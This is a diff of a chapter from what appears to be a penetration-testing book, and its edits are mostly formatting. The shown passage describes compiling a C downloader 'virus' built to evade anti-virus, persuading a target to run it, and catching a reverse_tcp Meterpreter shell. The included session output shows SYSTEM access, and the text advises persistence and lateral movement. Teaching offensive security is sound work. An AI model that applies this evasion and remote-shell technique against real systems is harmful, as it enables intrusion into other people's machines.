@@ -365,13 +365,14 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
       //fgets (buff, sizeof(buff), stdin);
     }
 
+{icon=bomb}
 G> With this, neither the payload or the virus should trigger Anti-Virus.
 G>
 G> Now you will need a c compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, so you should be good to compile the virus.
+G>
+G> G> `gcc download-payload-execute.c -o download-payload-execute.exe`
 
 {icon=bomb}
-G> `gcc download-payload-execute.c -o download-payload-execute.exe`
-G>
 G> This should provide you with an executable that AV will be happy about. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.
 G>
 G> Target runs payload:
@@ -381,7 +382,7 @@ G> `[*] Sending encoded stage (958029 bytes) to <target-ip>`
 G> `[*] Meterpreter session 6 opened (<listener-attack-ip>:4444 -> <target-ip>:63814) at 2016-12-28 15:31:29 +1300`  
 G> `msf exploit(handler) >`
 G>
-G> Now we have our shell. Type sessions to see its details:
+G> Now we have our shell. Type `sessions` to see its details:
 G>
 G> `msf exploit(handler) > sessions`
 G>
@@ -449,7 +450,8 @@ G> `Server username: NT AUTHORITY\SYSTEM`
 G>
 G> And no issue with Anti-Virus at all.  
 G> That is the easy part done, now you would need to setup persistence, and start moving laterally through the network.
-G>
+
+{icon=bomb}
 G> `meterpreter > exit`  
 G> `[*] Shutting down Meterpreter...`
 G>
